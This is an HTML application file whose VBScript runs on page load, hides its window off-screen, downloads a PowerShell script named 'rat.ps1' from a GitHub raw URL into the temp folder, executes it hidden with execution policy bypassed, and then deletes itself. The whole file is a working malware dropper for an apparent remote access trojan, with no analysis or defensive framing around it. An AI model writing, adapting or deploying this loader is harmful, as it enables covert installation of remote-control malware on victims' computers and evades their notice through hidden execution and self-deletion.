<!DOCTYPE html>
<html>
<head>
<script language="VBScript">
Sub Window_OnLoad
    Window.ResizeTo 0,0
    Window.MoveTo -2000,-2000
    
    Dim shell, fso, http, psPath, psURL
    
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' FIXED URL - no extra quote, correct path
    psURL = "https://raw.githubusercontent.com/Skibidi101201/rat/main/rat.ps1"
    
    psPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\run.ps1"
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.open "GET", psURL, False
    http.send
    
    If http.Status = 200 Then
        Dim file
        Set file = fso.CreateTextFile(psPath, True)
        file.Write http.responseText
        file.Close
        
        shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psPath & """", 0, False
    End If
    
    fso.DeleteFile Window.Location.Path
    Window.Close
End Sub
</script>
</head>
<body>
</body>
</html>
